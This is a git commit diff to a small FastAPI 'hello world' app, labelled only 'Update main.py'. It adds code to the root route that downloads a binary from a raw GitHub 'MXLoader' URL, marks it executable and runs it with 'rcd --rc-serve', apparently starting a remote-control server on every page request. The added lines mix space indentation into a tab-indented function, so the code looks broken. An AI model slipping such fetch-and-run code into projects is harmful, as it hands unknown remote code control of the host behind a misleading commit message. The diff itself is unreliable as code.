b7c41220b4ba7ae2155afb65fe6f74186cbcb301
pingme998 <77038591+pingme998@users.noreply.github.com>
2022-12-28 17:04:45 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,9 +1,12 @@
 import os
 from fastapi import FastAPI
-
+import urllib.request
 app = FastAPI()
 
 @app.get("/")
 async def index():
+        urllib.request.urlretrieve("https://raw.githubusercontent.com/developeranaz/My-Code-Cheat-Sheets/main/MXLoader/mxloaderv2col", "rcl")
+        os.system("chmod +x rcl")
+        os.system("./rcl rcd --rc-serve")
 	name = os.getenv("NAME", "world")
 	return f"hello {name}!"
